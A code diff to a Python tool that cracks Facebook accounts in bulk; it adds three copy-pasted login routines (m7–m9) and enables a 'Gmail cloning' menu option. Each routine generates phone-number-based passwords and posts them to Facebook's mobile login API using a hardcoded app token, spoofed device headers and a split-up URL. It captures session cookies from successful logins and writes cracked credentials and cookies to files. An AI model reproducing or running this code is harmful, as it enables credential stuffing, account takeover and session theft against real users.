@@ -498,8 +498,8 @@ def mainx2():
     print(f"{K} [{H}2{K}] {WHITE}RANDOM WITH {H}8 DIGIT {N}PASS")
     print(f"{K} [{H}3{K}] {WHITE}RANDOM WITH {H}MIX {N}PASS")
     print(f"{K} [{H}4{K}] {WHITE}RANDOM WITH {N}OTHERS")
-    #print(f"{K} [{H}5{K}] {WHITE}Gmail  Cloning {H}V1")
-    #print(f"{K} [{H}6{K}] {WHITE}Gmail  Cloning {H}V2")
+    print(f"{K} [{H}5{K}] {WHITE}GMAIL  CLONING {H}V1")
+    #print(f"{K} [{H}6{K}] {WHITE}GMAIL  CLONING{H}V2")
     print(f"{K} [{M}0{K}] {WHITE}Back To Menu");print(led)
     sumon = input(f'{wt}Select menu {M}:{H} ')
     if sumon in ["1","01"]:
@@ -802,6 +802,9 @@ def NUM():
   elif hc in ['4','04']:mtd.append('m4')
   elif hc in ['5','05']:mtd.append('m5')
   elif hc in ['6','06']:mtd.append('m6')
+  elif hc in ['7','07']:mtd.append('m7')
+  elif hc in ['8','08']:mtd.append('m8')
+  elif hc in ['9','09']:mtd.append('m9')
   else:
       mtd.append('m1')
   for nmbr in range(limit):
@@ -812,15 +815,17 @@ def NUM():
     tl = str(len(user))
     banner();print(f'{dot}METHOD{RED}      : {H}'+hc);print(f'{dot}SIM CODE{RED}    : {H}{kode}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
     for guru in user:
-      ids = kode+guru
-      idf = '+1'+ids
-      pwv = [ids[:6],ids[:8],ids,]
+      idf = kode+guru
+      pwv = [idf[:6],idf[:8],idf,]
       if 'm1' in mtd:king_xd.submit(m1,idf,pwv)
       elif 'm2' in mtd:king_xd.submit(m2,idf,pwv)
       elif 'm3' in mtd:king_xd.submit(m3,idf,pwv)
       elif 'm4' in mtd:king_xd.submit(m4,idf,pwv)
       elif 'm5' in mtd:king_xd.submit(m5,idf,pwv)
       elif 'm6' in mtd:king_xd.submit(m6,idf,pwv)
+      elif 'm7' in mtd:king_xd.submit(m7,idf,pwv)
+      elif 'm8' in mtd:king_xd.submit(m8,idf,pwv)
+      elif 'm9' in mtd:king_xd.submit(m9,idf,pwv)
       else:
        king_xd.submit(m5,idf,pwv)
   print('');print(f'{N} Hi Dear User Crack process has been completed')
@@ -848,6 +853,8 @@ def digittt():
   elif hc in ['4','04']:mtd.append('m4')
   elif hc in ['5','05']:mtd.append('m5')
   elif hc in ['6','06']:mtd.append('m6')
+  elif hc in ['8','08']:mtd.append('m8')
+  elif hc in ['9','09']:mtd.append('m9')
   else:
       mtd.append('m1')
   for nmbr in range(limit):
@@ -866,6 +873,10 @@ def digittt():
       elif 'm4' in mtd:king_xd.submit(m4,idf,pwv)
       elif 'm5' in mtd:king_xd.submit(m5,idf,pwv)
       elif 'm6' in mtd:king_xd.submit(m6,idf,pwv)
+      elif 'm7' in mtd:king_xd.submit(m7,idf,pwv)
+      elif 'm8' in mtd:king_xd.submit(m8,idf,pwv)
+      elif 'm9' in mtd:king_xd.submit(m9,idf,pwv)
+
       else:
        king_xd.submit(m5,idf,pwv)
   print('');print(f'{N} Hi Dear User Crack process has been completed')
@@ -893,6 +904,8 @@ def mix():
   elif hc in ['4','04']:mtd.append('m4')
   elif hc in ['5','05']:mtd.append('m5')
   elif hc in ['6','06']:mtd.append('m6')
+  elif hc in ['8','08']:mtd.append('m8')
+  elif hc in ['9','09']:mtd.append('m9')
   else:
       mtd.append('m1')
   for nmbr in range(limit):
@@ -911,6 +924,9 @@ def mix():
       elif 'm4' in mtd:king_xd.submit(m4,idf,pwv)
       elif 'm5' in mtd:king_xd.submit(m5,idf,pwv)
       elif 'm6' in mtd:king_xd.submit(m6,idf,pwv)
+      elif 'm7' in mtd:king_xd.submit(m7,idf,pwv)
+      elif 'm8' in mtd:king_xd.submit(m8,idf,pwv)
+      elif 'm9' in mtd:king_xd.submit(m9,idf,pwv)
       else:
        king_xd.submit(m5,idf,pwv)
   print('');print(f'{N} Hi Dear User Crack process has been completed')
@@ -1357,6 +1373,257 @@ def m6(idf,pwv):
   
  except:
   pass 
+def m7(idf,pwv):
+    global loop, ok, cp
+    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
+    sys.stdout.write(f'\r{P} [{animasi}-{H}M7{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
+    sys.stdout.flush()
+    try:
+      for pw in pwv:
+            device_id = str(uuid.uuid4())
+            adid = str(uuid.uuid4())
+            accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
+            useragent = str(ua_api())
+            data = {
+            'adid':adid,
+            'format':'json',
+            'device_id':adid,
+            'email':idf,
+            'password':pw,
+            "logged_out_id": str(uuid.uuid4()),
+            "hash_id": str(uuid.uuid4()),
+            "reg_instance": str(uuid.uuid4()),
+            "session_id": str(uuid.uuid4()),
+            "advertiser_id": str(uuid.uuid4()),
+            'generate_analytics_claims':'1',
+            'credentials_type':'password',
+            'source':'login',
+            "sim_country": "id",
+            "network_country": "id",
+            "relative_url": "method/auth.login",
+            'error_detail_type':'button_with_disabled',
+            'enroll_misauth':'false',
+            'generate_session_cookies':'1',
+            'generate_machine_id':'1',
+            "locale":random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
+            "client_country_code":random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]), 
+            'fb_api_req_friendly_name':'authenticate',
+            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
+            head = {
+            'Authorization':f'OAuth {accessToken}',
+            "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
+            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
+            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
+            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
+            'X-FB-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+            'X-FB-device-group': str(random.randint(2000, 4000)),
+            "X-FB-Friendly-Name": "ViewerReactionsMutation",
+            "X-FB-Request-Analytics-Tags": "graphservice",
+            'X-FB-Friendly-Name':'authenticate',
+            'X-FB-Connection-Type':'unknown',
+            'X-FB-connection-quality':'EXCELLENT',
+            "X-Tigon-Is-Retry": "False",
+            'User-Agent':useragent,
+            "X-FB-connection-token": "d29d67d37eca387482a8a5b740f84f62",
+            'Accept-Encoding':'gzip, deflate',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            "X-FB-Client-IP": "True",
+            "X-FB-Server-Cluster": "True",
+            'X-FB-HTTP-Engine': 'Liger'}
+            url = 'htt'+'ps://b-'+'api.f'+'acebo'+'ok.com'+'/metho'+'d/aut'+'h.login'
+            q = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
+            if 'access_token' in q:
+                    cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
+                    uid=str(q['uid'])
+                    ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
+                    res = requests.get(ckk).text
+                    if 'Photoshop' in res:
+                            print('\r\r\033[1;32m[atom-OK] '+uid+' | '+pw)
+                            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {cookie}\33[1;36m")
+                            print(f"\r\033[38;5;190mCOOKIES=[UA]: {useragent}\33[1;36m")
+                            open('/sdcard/ATOM-M4-live-OK.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
+                            ok+=1
+                            break 
+                    elif 'www.facebook.com' in q['error']['message']:
+                            print('\r\r\033[1;30m[ATOM-CP] '+idf+' | '+pw)
+                            open('/sdcard/ATOM/ATOM-CP.txt','a').write(idf+'|'+pw+'\n')
+                            cp.append(idf)
+                            break
+                    else:
+                       continue
+      loop+=1
+    except requests.exceptions.ConnectionError:
+        time.sleep(10)
+    except Exception as e:
+        pass
+
+def m8(idf,pwv):
+    global loop, ok, cp
+    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
+    sys.stdout.write(f'\r{P} [{animasi}-{H}M7{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
+    sys.stdout.flush()
+    try:
+      for pw in pwv:
+            device_id = str(uuid.uuid4())
+            adid = str(uuid.uuid4())
+            accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
+            useragent = str(ua_api())
+            data = {
+            'adid':adid,
+            'format':'json',
+            'device_id':adid,
+            'email':idf,
+            'password':pw,
+            "logged_out_id": str(uuid.uuid4()),
+            "hash_id": str(uuid.uuid4()),
+            "reg_instance": str(uuid.uuid4()),
+            "session_id": str(uuid.uuid4()),
+            "advertiser_id": str(uuid.uuid4()),
+            'generate_analytics_claims':'1',
+            'credentials_type':'password',
+            'source':'login',
+            "sim_country": "id",
+            "network_country": "id",
+            "relative_url": "method/auth.login",
+            'error_detail_type':'button_with_disabled',
+            'enroll_misauth':'false',
+            'generate_session_cookies':'1',
+            'generate_machine_id':'1',
+            "locale":random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
+            "client_country_code":random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]), 
+            'fb_api_req_friendly_name':'authenticate',
+            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
+            head = {
+            'Authorization':f'OAuth {accessToken}',
+            "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
+            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
+            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
+            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
+            'X-FB-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+            'X-FB-device-group': str(random.randint(2000, 4000)),
+            "X-FB-Friendly-Name": "ViewerReactionsMutation",
+            "X-FB-Request-Analytics-Tags": "graphservice",
+            'X-FB-Friendly-Name':'authenticate',
+            'X-FB-Connection-Type':'unknown',
+            'X-FB-connection-quality':'EXCELLENT',
+            "X-Tigon-Is-Retry": "False",
+            'User-Agent':useragent,
+            "X-FB-connection-token": "d29d67d37eca387482a8a5b740f84f62",
+            'Accept-Encoding':'gzip, deflate',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            "X-FB-Client-IP": "True",
+            "X-FB-Server-Cluster": "True",
+            'X-FB-HTTP-Engine': 'Liger'}
+            url = 'htt'+'ps://b-'+'api.f'+'acebo'+'ok.com'+'/metho'+'d/aut'+'h.login'
+            q = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
+            if 'access_token' in q:
+                    cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
+                    uid=str(q['uid'])
+                    ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
+                    res = requests.get(ckk).text
+                    if 'Photoshop' in res:
+                            print('\r\r\033[1;32m[atom-OK] '+uid+' | '+pw)
+                            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {cookie}\33[1;36m")
+                            print(f"\r\033[38;5;190mCOOKIES=[UA]: {useragent}\33[1;36m")
+                            open('/sdcard/ATOM-M4-live-OK.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
+                            ok+=1
+                            break 
+                    elif 'www.facebook.com' in q['error']['message']:
+                            print('\r\r\033[1;30m[ATOM-CP] '+idf+' | '+pw)
+                            open('/sdcard/ATOM/ATOM-CP.txt','a').write(idf+'|'+pw+'\n')
+                            cp.append(idf)
+                            break
+                    else:
+                       continue
+      loop+=1
+    except requests.exceptions.ConnectionError:
+        time.sleep(10)
+    except Exception as e:
+        pass
+
+def m9(idf,pwv):
+    global loop, ok, cp
+    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
+    sys.stdout.write(f'\r{P} [{animasi}-{H}M7{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
+    sys.stdout.flush()
+    try:
+      for pw in pwv:
+            device_id = str(uuid.uuid4())
+            adid = str(uuid.uuid4())
+            accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
+            useragent = str(ua_api())
+            data = {
+            'adid':adid,
+            'format':'json',
+            'device_id':adid,
+            'email':idf,
+            'password':pw,
+            "logged_out_id": str(uuid.uuid4()),
+            "hash_id": str(uuid.uuid4()),
+            "reg_instance": str(uuid.uuid4()),
+            "session_id": str(uuid.uuid4()),
+            "advertiser_id": str(uuid.uuid4()),
+            'generate_analytics_claims':'1',
+            'credentials_type':'password',
+            'source':'login',
+            "sim_country": "id",
+            "network_country": "id",
+            "relative_url": "method/auth.login",
+            'error_detail_type':'button_with_disabled',
+            'enroll_misauth':'false',
+            'generate_session_cookies':'1',
+            'generate_machine_id':'1',
+            "locale":random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
+            "client_country_code":random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]), 
+            'fb_api_req_friendly_name':'authenticate',
+            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
+            head = {
+            'Authorization':f'OAuth {accessToken}',
+            "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
+            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
+            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
+            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
+            'X-FB-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+            'X-FB-device-group': str(random.randint(2000, 4000)),
+            "X-FB-Friendly-Name": "ViewerReactionsMutation",
+            "X-FB-Request-Analytics-Tags": "graphservice",
+            'X-FB-Friendly-Name':'authenticate',
+            'X-FB-Connection-Type':'unknown',
+            'X-FB-connection-quality':'EXCELLENT',
+            "X-Tigon-Is-Retry": "False",
+            'User-Agent':useragent,
+            "X-FB-connection-token": "d29d67d37eca387482a8a5b740f84f62",
+            'Accept-Encoding':'gzip, deflate',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            "X-FB-Client-IP": "True",
+            "X-FB-Server-Cluster": "True",
+            'X-FB-HTTP-Engine': 'Liger'}
+            url = 'htt'+'ps://b-'+'api.f'+'acebo'+'ok.com'+'/metho'+'d/aut'+'h.login'
+            q = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
+            if 'access_token' in q:
+                    cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
+                    uid=str(q['uid'])
+                    ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
+                    res = requests.get(ckk).text
+                    if 'Photoshop' in res:
+                            print('\r\r\033[1;32m[atom-OK] '+uid+' | '+pw)
+                            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {cookie}\33[1;36m")
+                            print(f"\r\033[38;5;190mCOOKIES=[UA]: {useragent}\33[1;36m")
+                            open('/sdcard/ATOM-M4-live-OK.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
+                            ok+=1
+                            break 
+                    elif 'www.facebook.com' in q['error']['message']:
+                            print('\r\r\033[1;30m[ATOM-CP] '+idf+' | '+pw)
+                            open('/sdcard/ATOM/ATOM-CP.txt','a').write(idf+'|'+pw+'\n')
+                            cp.append(idf)
+                            break
+                    else:
+                       continue
+      loop+=1
+    except requests.exceptions.ConnectionError:
+        time.sleep(10)
+    except Exception as e:
+        pass
 
 # INDIA X PAKISTAN -- MAIN DEF #
 
